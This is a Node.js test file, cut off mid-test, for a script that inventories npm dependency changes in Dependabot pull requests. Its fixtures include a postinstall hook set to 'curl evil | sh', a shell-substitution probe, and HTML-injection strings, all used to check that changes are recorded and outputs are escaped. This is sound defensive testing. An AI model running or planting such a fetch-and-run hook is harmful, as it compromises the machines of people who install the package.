import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { test } from 'node:test';

import {
  compareNpm,
  collectInventory,
  main,
  parseArgs,
  parseNpmSource,
  renderMarkdown,
  runLocalCommand,
} from '../../scripts/dependency-inventory.mjs';

const manifest = (dependencies = {}, devDependencies = {}) => ({ dependencies, devDependencies });

const lock = (packages = {}) => ({ lockfileVersion: 3, packages: { '': {}, ...packages } });

test('rejects unknown and malformed command arguments', () => {
  assert.throws(() => parseArgs(['--format', 'xml']), /--format/);
  assert.throws(() => parseArgs(['--pr', '0']), /positive integer/);
  assert.throws(() => parseArgs(['--unexpected']), /unknown argument/);
});

test('reports an already represented package without treating it as approval', () => {
  const result = compareNpm(
    { manifest: manifest({ 'js-yaml': '^5.2.2' }), lock: lock({ 'node_modules/js-yaml': { version: '5.2.2', integrity: 'base' } }) },
    { manifest: manifest({ 'js-yaml': '^5.4.1' }), lock: lock({ 'node_modules/js-yaml': { version: '5.4.1', integrity: 'head' } }) },
    { manifest: manifest({ 'js-yaml': '^5.4.1' }), lock: lock({ 'node_modules/js-yaml': { version: '5.4.1', integrity: 'head' } }) },
  );

  assert.equal(result.status, 'already_represented');
  assert.equal(result.approved, false);
  assert.equal(result.packages[0].authorityMatchesProposed, true);
  assert.equal(result.packages[0].mergeBase.version, '5.2.2');
});

test('preserves an integrity-only lockfile change as evidence', () => {
  const result = compareNpm(
    { manifest: manifest({ chalk: '^4.1.2' }), lock: lock({ 'node_modules/chalk': { version: '4.1.2', integrity: 'before' } }) },
    { manifest: manifest({ chalk: '^4.1.2' }), lock: lock({ 'node_modules/chalk': { version: '4.1.2', integrity: 'after' } }) },
    { manifest: manifest({ chalk: '^4.1.2' }), lock: lock({ 'node_modules/chalk': { version: '4.1.2', integrity: 'before' } }) },
  );

  assert.equal(result.status, 'different');
  assert.equal(result.packages[0].proposed.integrity, 'after');
  assert.equal(result.packages[0].authorityMatchesProposed, false);
});

test('preserves safe lockfile metadata while redacting credential-bearing resolved URLs', () => {
  const result = compareNpm(
    { manifest: manifest(), lock: lock({ 'node_modules/example': { version: '1.0.0', resolved: 'https://registry.example/example.tgz', dependencies: { nested: '^1.0.0' }, dev: true } }) },
    { manifest: manifest(), lock: lock({ 'node_modules/example': { version: '1.0.0', resolved: 'https://user:token@registry.example/example.tgz?access_token=secret#fragment', dependencies: { nested: '^1.1.0' }, dev: false } }) },
    { manifest: manifest(), lock: lock({ 'node_modules/example': { version: '1.0.0', resolved: 'https://user:token@registry.example/example.tgz?access_token=secret#fragment', dependencies: { nested: '^1.1.0' }, dev: false } }) },
  );

  assert.equal(result.status, 'already_represented');
  assert.deepEqual(result.packages[0].proposed.dependencies, { nested: '^1.1.0' });
  assert.equal(result.packages[0].proposed.dev, false);
  assert.equal(result.packages[0].proposed.resolved, 'https://registry.example/example.tgz');
  assert.doesNotMatch(JSON.stringify(result), /token|secret|access_token|fragment/);
});

test('preserves dependency-section identity, overrides, and the lockfile root entry', () => {
  const result = compareNpm(
    { manifest: { ...manifest({ library: '^1.0.0' }, { library: '^1.0.0' }), overrides: { transitive: '1.0.0' } }, lock: lock() },
    { manifest: { ...manifest({ library: '^2.0.0' }, { library: '^1.0.0' }), overrides: { transitive: '1.1.0' } }, lock: { lockfileVersion: 3, packages: { '': { dependencies: { library: '^2.0.0' } } } } },
    { manifest: { ...manifest({ library: '^2.0.0' }, { library: '^1.0.0' }), overrides: { transitive: '1.1.0' } }, lock: { lockfileVersion: 3, packages: { '': { dependencies: { library: '^2.0.0' } } } } },
  );

  assert.ok(result.packages.some((entry) => entry.path === 'package.json#dependencies:library'));
  assert.ok(result.packages.some((entry) => entry.path === 'package.json#overrides:transitive'));
  assert.ok(result.packages.some((entry) => entry.path === 'package-lock.json#root'));
});

test('preserves deleted entries and lifecycle-script metadata as comparison evidence', () => {
  const result = compareNpm(
    { manifest: manifest({ native: '^1.0.0' }), lock: lock({ 'node_modules/native': { version: '1.0.0', hasInstallScript: true }, 'node_modules/removed': { version: '1.0.0' } }) },
    { manifest: manifest({ native: '^1.0.0' }), lock: lock({ 'node_modules/native': { version: '1.0.0', hasInstallScript: false } }) },
    { manifest: manifest({ native: '^1.0.0' }), lock: lock({ 'node_modules/native': { version: '1.0.0', hasInstallScript: false } }) },
  );

  assert.equal(result.packages.find((entry) => entry.path === 'node_modules/removed').proposed, null);
  assert.equal(result.packages.find((entry) => entry.path === 'node_modules/native').proposed.hasInstallScript, false);
});

test('records package manifest lifecycle-script changes even when the lockfile is identical', () => {
  const result = compareNpm(
    { manifest: { ...manifest(), scripts: { postinstall: 'safe' } }, lock: lock() },
    { manifest: { ...manifest(), scripts: { postinstall: 'curl evil | sh' } }, lock: lock() },
    { manifest: { ...manifest(), scripts: { postinstall: 'safe' } }, lock: lock() },
  );

  const entry = result.packages.find((item) => item.path === 'package.json#lifecycle-scripts');
  assert.equal(result.status, 'different');
  assert.equal(entry.proposed.postinstall, 'curl evil | sh');
  assert.equal(entry.authorityMatchesProposed, false);
});

test('records every supported npm lifecycle hook as evidence', () => {
  const result = compareNpm(
    { manifest: { ...manifest(), scripts: { prepack: 'before' } }, lock: lock() },
    { manifest: { ...manifest(), scripts: { prepack: 'after', postversion: 'release' } }, lock: lock() },
    { manifest: { ...manifest(), scripts: { prepack: 'after', postversion: 'release' } }, lock: lock() },
  );

  const lifecycle = result.packages.find((entry) => entry.path === 'package.json#lifecycle-scripts');
  assert.equal(lifecycle.proposed.prepack, 'after');
  assert.equal(lifecycle.proposed.postversion, 'release');
});

test('rejects unsupported npm lockfile shapes instead of treating them as clean', () => {
  assert.throws(() => compareNpm(
    { manifest: manifest(), lock: { lockfileVersion: 1 } },
    { manifest: manifest(), lock: lock() },
    { manifest: manifest(), lock: lock() },
  ), /unsupported lockfile/);
  assert.throws(() => compareNpm(
    { manifest: manifest(), lock: { packages: [] } },
    { manifest: manifest(), lock: lock() },
    { manifest: manifest(), lock: lock() },
  ), /unsupported lockfile/);
});

test('rejects a contents API object envelope on either fixed npm path', () => {
  assert.throws(() => parseNpmSource(JSON.stringify({ type: 'file', encoding: 'base64', content: 'eyJub3QtbG9jayI6dHJ1ZX0=' }), JSON.stringify(lock()), 'fixture'), /invalid npm source/);
  assert.throws(() => parseNpmSource(JSON.stringify(manifest()), JSON.stringify({ type: 'file', encoding: 'base64', content: 'eyJub3QtbG9jayI6dHJ1ZX0=' }), 'fixture'), /invalid npm source/);
});

test('accepts standard npm package type fields while rejecting contents envelopes', () => {
  const source = parseNpmSource(JSON.stringify({ ...manifest(), type: 'module' }), JSON.stringify(lock()), 'fixture');
  assert.equal(source.manifest.type, 'module');
});

test('enforces local subprocess buffer and timeout limits without invoking a shell', () => {
  const bufferResult = runLocalCommand(process.execPath, ['-e', "process.stdout.write('x'.repeat(2048))"], { maxBuffer: 1024 });
  const timeoutResult = runLocalCommand(process.execPath, ['-e', 'setTimeout(() => {}, 250)'], { timeout: 10 });
  const literalResult = runLocalCommand(process.execPath, ['-e', 'process.stdout.write(process.argv[1])', '$(not-a-shell-command)']);

  assert.equal(bufferResult.status, 1);
  assert.equal(timeoutResult.status, 1);
  assert.equal(literalResult.stdout, '$(not-a-shell-command)');
});

test('reports transitive-only and grouped package changes', () => {
  const result = compareNpm(
    { manifest: manifest(), lock: lock({ 'node_modules/a': { version: '1.0.0' }, 'node_modules/b': { version: '1.0.0' } }) },
    { manifest: manifest(), lock: lock({ 'node_modules/a': { version: '1.1.0' }, 'node_modules/b': { version: '1.2.0' } }) },
    { manifest: manifest(), lock: lock({ 'node_modules/a': { version: '1.1.0' }, 'node_modules/b': { version: '1.2.0' } }) },
  );

  assert.equal(result.packages.length, 2);
  assert.deepEqual(result.packages.map((entry) => entry.path), ['node_modules/a', 'node_modules/b']);
  assert.ok(result.packages.every((entry) => entry.kind === 'transitive'));
});

test('marks authority branch mismatch visibly in Markdown', async () => {
  const inventory = await collectInventory({
    now: () => '2026-09-14T00:00:00.000Z',
    run: async () => {
      throw new Error('runner should not be called when fixture inventory is supplied');
    },
  }, {
    authority: { status: 'verified', sourceRef: 'origin/Working-Branch', head: 'authority-sha', handoffRelative: 'docs/SESSION-HANDOFF-2026-09-12.md' },
    repository: 'KStratMD/Preston-Test',
    prs: [{ number: 9, url: 'https://example.invalid/pr/9', author: 'dependabot[bot]', baseBranch: 'main', baseBranchMatchesAuthority: false, status: 'open', npm: { status: 'different', packages: [] } }],
    alerts: { status: 'unavailable', error: 'forbidden' },
  });

  assert.equal(inventory.status, 'partial');
  assert.match(renderMarkdown(inventory), /base branch differs from authority/i);
  assert.match(renderMarkdown(inventory), /alerts: unavailable/i);
});

test('HTML-escapes remotely supplied values in Markdown output', () => {
  const output = renderMarkdown({
    generatedAt: '2026-09-14T00:00:00.000Z', status: 'complete',
    authority: { sourceRef: 'origin/<script>', head: 'aaaaaaaa' },
    prs: [{ number: 14, baseBranch: '<img src=x>', npm: { status: 'different' } }],
    alerts: { status: 'available' }, errors: [{ source: 'remote&source', message: '<unsafe>' }],
  });
  assert.match(output, /&lt;script&gt;/);
  assert.match(output, /&lt;img src=x&gt;/);
  assert.match(output, /remote&amp;source/);
  assert.doesNotMatch(output, /<script>|<img/);
});

test('fails closed before collecting PRs when authority is degraded', async () => {
  let calls = 0;
  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: async () => { calls += 1; return { status: 0, stdout: '' }; } }, {
    authority: { status: 'degraded', sourceRef: 'origin/Working-Branch' },
  });

  assert.equal(inventory.exitCode, 1);
  assert.equal(inventory.status, 'partial');
  assert.equal(calls, 0);
  assert.match(inventory.errors[0].message, /verified authority/i);
});

test('reports inaccessible advisory evidence as partial rather than clean', async () => {
  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: async () => ({ status: 0, stdout: '' }) }, {
    authority: { status: 'verified', head: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' },
    repository: 'KStratMD/Preston-Test',
    prs: [],
    alerts: { status: 'unavailable', error: 'forbidden' },
  });

  assert.equal(inventory.status, 'partial');
  assert.equal(inventory.exitCode, 2);
});

test('labels a remote repository mismatch without exposing the remote URL', async () => {
  const inventory = await collectInventory({
    now: () => '2026-09-14T00:00:00.000Z',
    run: async (command, args) => {
      if (command === 'gh') return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
      if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://example.invalid/secret-token.git\n' };
      throw new Error('unexpected command');
    },
  }, { authority: { status: 'verified', head: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' } });

  assert.equal(inventory.status, 'partial');
  assert.deepEqual(inventory.errors[0], { source: 'repository', code: 'repository_identity_mismatch', message: 'origin repository differs from GitHub CLI repository' });
  assert.doesNotMatch(JSON.stringify(inventory), /secret-token/);
});

test('accepts a dotted GitHub repository name from origin', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/repo.name\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/repo.name.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open') || endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: '[]' };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha }) }, {
    authority: { status: 'verified', head: authoritySha },
  });
  assert.equal(inventory.status, 'complete');
  assert.equal(inventory.repository, 'KStratMD/repo.name');
});

test('fails closed before repository work when a verified authority has an invalid SHA', async () => {
  let calls = 0;
  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: async () => { calls += 1; return { status: 0, stdout: '' }; } }, {
    authority: { status: 'verified', head: 'not-a-sha' },
  });

  assert.equal(inventory.exitCode, 1);
  assert.equal(calls, 0);
  assert.equal(inventory.errors[0].source, 'authority');
});

test('retains only the authority fields needed for an inventory snapshot', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: async () => ({ status: 0, stdout: '' }) }, {
    authority: { status: 'verified', sourceRef: 'origin/Working-Branch', head: authoritySha, handoff: 'do not emit this body' },
    repository: 'KStratMD/Preston-Test',
    prs: [],
    alerts: { status: 'available' },
  });

  assert.deepEqual(inventory.authority, { status: 'verified', sourceRef: 'origin/Working-Branch', handoffRelative: null, head: authoritySha });
  assert.doesNotMatch(JSON.stringify(inventory), /do not emit this body/);
});

test('reads the verified authority source through immutable local Git objects', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const calls = [];
  const runner = async (command, args) => {
    calls.push([command, args]);
    const joined = args.join(' ');
    if (command === 'gh' && joined.startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && joined === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && joined === `show ${authoritySha}:package.json`) return { status: 0, stdout: JSON.stringify(manifest({ chalk: '^4.1.2' })) };
    if (command === 'git' && joined === `show ${authoritySha}:package-lock.json`) return { status: 0, stdout: JSON.stringify(lock({ 'node_modules/chalk': { version: '4.1.2' } })) };
    if (command === 'gh' && joined.includes('/pulls?state=open')) return { status: 0, stdout: '[]' };
    if (command === 'gh' && joined.includes('/dependabot/alerts?state=open')) return { status: 0, stdout: '[]' };
    throw new Error(`unexpected command: ${command} ${joined}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha }) }, {
    authority: { status: 'verified', sourceRef: 'origin/Working-Branch', head: authoritySha },
  });

  assert.equal(inventory.status, 'complete');
  assert.ok(calls.some(([command, args]) => command === 'git' && args[0] === 'show' && args[1] === `${authoritySha}:package.json`));
  assert.ok(calls.some(([command, args]) => command === 'git' && args[0] === 'show' && args[1] === `${authoritySha}:package-lock.json`));
});

test('marks a PR snapshot partial when its head changes during collection', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const baseSha = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const firstHead = 'cccccccccccccccccccccccccccccccccccccccc';
  const secondHead = 'dddddddddddddddddddddddddddddddddddddddd';
  let detailReads = 0;
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open')) return { status: 0, stdout: JSON.stringify([{ number: 9, user: { login: 'dependabot[bot]', type: 'Bot' }, labels: [] }]) };
    if (endpoint === 'repos/KStratMD/Preston-Test/pulls/9') {
      detailReads += 1;
      return { status: 0, stdout: JSON.stringify({ number: 9, state: 'open', user: { login: 'dependabot[bot]' }, base: { ref: 'Working-Branch', sha: baseSha }, head: { sha: detailReads === 1 ? firstHead : secondHead }, labels: [] }) };
    }
    if (endpoint.includes(`/compare/${baseSha}...${firstHead}`)) return { status: 0, stdout: JSON.stringify({ merge_base_commit: { sha: baseSha } }) };
    if (endpoint.includes('/pulls/9/files')) return { status: 0, stdout: JSON.stringify([[]]) };
    if (endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: JSON.stringify([[]]) };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' }) }, {
    authority: { status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' },
  });

  assert.equal(inventory.status, 'partial');
  assert.equal(inventory.prs[0].baseBranchMatchesAuthority, true);
  assert.equal(inventory.prs[0].snapshotStatus, 'moved');
  assert.match(inventory.errors[0].message, /moved/i);
});

test('marks the snapshot partial when the authority tip changes', async () => {
  const firstAuthority = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const secondAuthority = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open') || endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: '[]' };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: secondAuthority }) }, {
    authority: { status: 'verified', head: firstAuthority },
  });

  assert.equal(inventory.status, 'partial');
  assert.match(inventory.errors[0].message, /authority moved/i);
});

test('does not report a specifically requested closed PR as an empty clean inventory', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const baseSha = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const headSha = 'cccccccccccccccccccccccccccccccccccccccc';
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open') || endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: '[]' };
    if (endpoint === 'repos/KStratMD/Preston-Test/pulls/1296') return { status: 0, stdout: JSON.stringify({ number: 1296, state: 'closed', html_url: 'https://example.invalid/pr/1296', user: { login: 'dependabot[bot]', type: 'Bot' }, base: { ref: 'Working-Branch', sha: baseSha }, head: { sha: headSha }, labels: [] }) };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' }) }, {
    authority: { status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' },
    prNumbers: [1296],
  });

  assert.equal(inventory.status, 'partial');
  assert.equal(inventory.exitCode, 2);
  assert.equal(inventory.prs[0].status, 'closed');
  assert.match(inventory.errors[0].message, /not open/i);
});

test('keeps an explicit manual-analysis record when fixed-path contents are unavailable', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const baseSha = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const headSha = 'cccccccccccccccccccccccccccccccccccccccc';
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open')) return { status: 0, stdout: JSON.stringify([{ number: 10, user: { login: 'dependabot[bot]', type: 'Bot' }, labels: [] }]) };
    if (endpoint === 'repos/KStratMD/Preston-Test/pulls/10') return { status: 0, stdout: JSON.stringify({ number: 10, state: 'open', user: { login: 'dependabot[bot]' }, base: { ref: 'Working-Branch', sha: baseSha }, head: { sha: headSha }, labels: [] }) };
    if (endpoint.includes(`/compare/${baseSha}...${headSha}`)) return { status: 0, stdout: JSON.stringify({ merge_base_commit: { sha: baseSha } }) };
    if (endpoint.includes('/pulls/10/files')) return { status: 0, stdout: JSON.stringify([[{ filename: 'package-lock.json' }]]) };
    if (endpoint.includes('/contents/')) return { status: 1, stdout: '' };
    if (endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: JSON.stringify([[]]) };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' }) }, {
    authority: { status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' },
  });

  assert.equal(inventory.status, 'partial');
  assert.equal(inventory.prs[0].number, 10);
  assert.equal(inventory.prs[0].npm.status, 'manual_analysis');
});

test('retains detailed PR evidence when a later collection operation is unavailable', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const baseSha = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const headSha = 'cccccccccccccccccccccccccccccccccccccccc';
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open')) return { status: 0, stdout: JSON.stringify([{ number: 12, user: { login: 'dependabot[bot]', type: 'Bot' }, labels: [] }]) };
    if (endpoint === 'repos/KStratMD/Preston-Test/pulls/12') return { status: 0, stdout: JSON.stringify({ number: 12, state: 'open', html_url: 'https://example.invalid/pr/12', user: { login: 'dependabot[bot]' }, base: { ref: 'Working-Branch', sha: baseSha }, head: { sha: headSha }, labels: [] }) };
    if (endpoint.includes(`/compare/${baseSha}...${headSha}`)) return { status: 0, stdout: JSON.stringify({ merge_base_commit: { sha: baseSha } }) };
    if (endpoint.includes('/pulls/12/files')) return { status: 1, stdout: '' };
    if (endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: JSON.stringify([[]]) };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };
  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha }) }, { authority: { status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' } });

  assert.equal(inventory.status, 'partial');
  assert.equal(inventory.prs[0].url, 'https://example.invalid/pr/12');
  assert.equal(inventory.prs[0].head, headSha);
  assert.equal(inventory.prs[0].mergeBase, baseSha);
  assert.equal(inventory.prs[0].npm.status, 'manual_analysis');
});

test('records added or deleted npm manifest paths for manual analysis without hiding them as unavailable', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const baseSha = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const headSha = 'cccccccccccccccccccccccccccccccccccccccc';
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest() : lock()) };
    if (endpoint.includes('/pulls?state=open')) return { status: 0, stdout: JSON.stringify([{ number: 13, user: { login: 'dependabot[bot]', type: 'Bot' }, labels: [] }]) };
    if (endpoint === 'repos/KStratMD/Preston-Test/pulls/13') return { status: 0, stdout: JSON.stringify({ number: 13, state: 'open', user: { login: 'dependabot[bot]' }, base: { ref: 'Working-Branch', sha: baseSha }, head: { sha: headSha }, labels: [] }) };
    if (endpoint.includes(`/compare/${baseSha}...${headSha}`)) return { status: 0, stdout: JSON.stringify({ merge_base_commit: { sha: baseSha } }) };
    if (endpoint.includes('/pulls/13/files')) return { status: 0, stdout: JSON.stringify([[{ filename: 'package-lock.json', status: 'added' }]]) };
    if (endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: JSON.stringify([[]]) };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };
  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha }) }, { authority: { status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' } });

  assert.equal(inventory.prs[0].npm.status, 'manual_analysis');
  assert.deepEqual(inventory.prs[0].npm.packages, [{ path: 'package-lock.json', kind: 'manifest', change: 'added' }]);
});

test('uses the merge base rather than an advanced base tip for npm comparison', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const baseTip = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';
  const mergeBase = 'cccccccccccccccccccccccccccccccccccccccc';
  const headSha = 'dddddddddddddddddddddddddddddddddddddddd';
  const calls = [];
  const runner = async (command, args) => {
    const endpoint = args.at(-1);
    calls.push([command, args]);
    if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
    if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
    if (command === 'git' && args[0] === 'show') return { status: 0, stdout: JSON.stringify(args[1].endsWith('package.json') ? manifest({ library: '^1.0.0' }) : lock({ 'node_modules/library': { version: '1.0.0' } })) };
    if (endpoint.includes('/pulls?state=open')) return { status: 0, stdout: JSON.stringify([{ number: 11, user: { login: 'dependabot[bot]', type: 'Bot' }, labels: [] }]) };
    if (endpoint === 'repos/KStratMD/Preston-Test/pulls/11') return { status: 0, stdout: JSON.stringify({ number: 11, state: 'open', user: { login: 'dependabot[bot]' }, base: { ref: 'Working-Branch', sha: baseTip }, head: { sha: headSha }, labels: [] }) };
    if (endpoint.includes(`/compare/${baseTip}...${headSha}`)) return { status: 0, stdout: JSON.stringify({ merge_base_commit: { sha: mergeBase } }) };
    if (endpoint.includes('/pulls/11/files')) return { status: 0, stdout: JSON.stringify([[{ filename: 'package.json' }, { filename: 'package-lock.json' }]]) };
    if (endpoint.includes(`/contents/package.json?ref=${mergeBase}`)) return { status: 0, stdout: JSON.stringify(manifest({ library: '^1.0.0' })) };
    if (endpoint.includes(`/contents/package-lock.json?ref=${mergeBase}`)) return { status: 0, stdout: JSON.stringify(lock({ 'node_modules/library': { version: '1.0.0' } })) };
    if (endpoint.includes(`/contents/package.json?ref=${headSha}`)) return { status: 0, stdout: JSON.stringify(manifest({ library: '^1.1.0' })) };
    if (endpoint.includes(`/contents/package-lock.json?ref=${headSha}`)) return { status: 0, stdout: JSON.stringify(lock({ 'node_modules/library': { version: '1.1.0' } })) };
    if (endpoint.includes('/dependabot/alerts')) return { status: 0, stdout: JSON.stringify([[]]) };
    throw new Error(`unexpected command: ${command} ${args.join(' ')}`);
  };

  const inventory = await collectInventory({ now: () => '2026-09-14T00:00:00.000Z', run: runner, resolveAuthority: async () => ({ status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' }) }, {
    authority: { status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' },
  });

  assert.equal(inventory.prs[0].mergeBase, mergeBase);
  assert.equal(inventory.prs[0].npm.packages[0].mergeBase.version, '1.0.0');
  assert.ok(!calls.some(([, args]) => args.join(' ').includes(`/contents/package.json?ref=${baseTip}`)));
});

test('imports without running the command-line inventory', () => {
  const result = spawnSync(process.execPath, ['--input-type=module', '-e', "import('./scripts/dependency-inventory.mjs')"], { encoding: 'utf8', shell: false });
  assert.equal(result.status, 0);
  assert.equal(result.stdout, '');
  assert.equal(result.stderr, '');
  assert.equal(typeof collectInventory, 'function');
});

test('runs the public CLI path with explicit PR selection and reports its partial exit status', async () => {
  const authoritySha = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
  const result = await main(['--format', 'markdown', '--pr', '99'], {
    now: () => '2026-09-14T00:00:00.000Z',
    resolveAuthority: async () => ({ status: 'verified', head: authoritySha, sourceRef: 'origin/Working-Branch' }),
    run: async (command, args) => {
      const endpoint = args.at(-1);
      if (command === 'gh' && args.join(' ').startsWith('repo view')) return { status: 0, stdout: 'KStratMD/Preston-Test\n' };
      if (command === 'git' && args.join(' ') === 'remote get-url origin') return { status: 0, stdout: 'https://github.com/KStratMD/Preston-Test.git\n' };
